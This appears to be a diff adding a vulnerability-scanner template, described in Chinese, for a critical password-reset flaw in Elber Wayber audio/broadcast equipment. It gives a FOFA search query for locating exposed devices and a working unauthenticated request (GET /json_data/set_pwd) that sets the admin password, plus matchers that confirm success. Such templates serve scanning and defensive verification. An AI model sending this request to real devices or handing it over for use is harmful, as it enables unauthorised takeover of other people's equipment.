@@ -1,0 +1,25 @@
+## id: VEID-2025-0104
+## name: Elber-Wayber模拟数字音频密码重置漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,password,veid2025
+## description:Elber wavber 模拟/数字音频系统,存在一个严重的 安全漏洞只，该漏洞位于系统的密码重置功能中。攻击者可以通过利用此漏洞。绕过正常的身份验证流程，直接重置用户密码，从而非法获取系统访问权限。一旦攻击者成功重置密码，他们可以登录系统并完全接管控制权，进而窃取敏感数据、篡改系统设置或进行其他恶意操作。
+## fofa-query: title="Elber Satellite Equipment" || body="www.elber.it"
+## verification: true
+
+
+GET /json_data/set_pwd?lev=2&pass=admin1234 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/json
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "successfully"
+
+
+
+
+
+# @VEIL-STAMP: c7761955814cd8f98e18cf47afbc39fd79aac836e06af7d3610ec0b5b255bce9
